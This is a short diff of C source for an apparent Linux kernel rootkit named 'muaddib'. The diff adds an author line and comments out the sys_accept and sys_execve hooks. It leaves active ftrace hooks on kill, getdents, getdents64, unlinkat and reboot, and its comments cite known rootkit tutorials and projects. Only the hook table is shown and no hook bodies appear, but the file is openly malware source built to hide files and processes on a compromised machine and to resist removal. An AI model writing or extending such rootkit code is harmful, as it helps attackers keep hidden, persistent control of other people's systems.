@@ -1,3 +1,5 @@
+//Daniel Railic
+
 //https://xcellerator.github.io/posts/linux_rootkits_11/
 //https://github.com/m0nad/Diamorphine
 //https://github.com/h3xduck/Umbra
@@ -22,10 +24,10 @@ asmlinkage int muaddib_reboot(int magic, int magic2, int cmd, void *arg);
 
 static struct ftrace_hook hooks[] = {
 	HOOK("sys_kill", muaddib_kill, &og_kill),
-    HOOK("sys_accept", muaddib_accept, &og_accept),
+    //HOOK("sys_accept", muaddib_accept, &og_accept),
 	HOOK("sys_getdents64", muaddib_getdents64, &og_getdents64),
 	HOOK("sys_getdents", muaddib_getdents, &og_getdents),
-	HOOK("sys_execve", muaddib_execve, &og_execve),
+	//HOOK("sys_execve", muaddib_execve, &og_execve),
 	HOOK("sys_unlinkat", muaddib_unlinkat, &og_unlinkat),
 	HOOK("sys_reboot", muaddib_reboot, &og_reboot),
 };
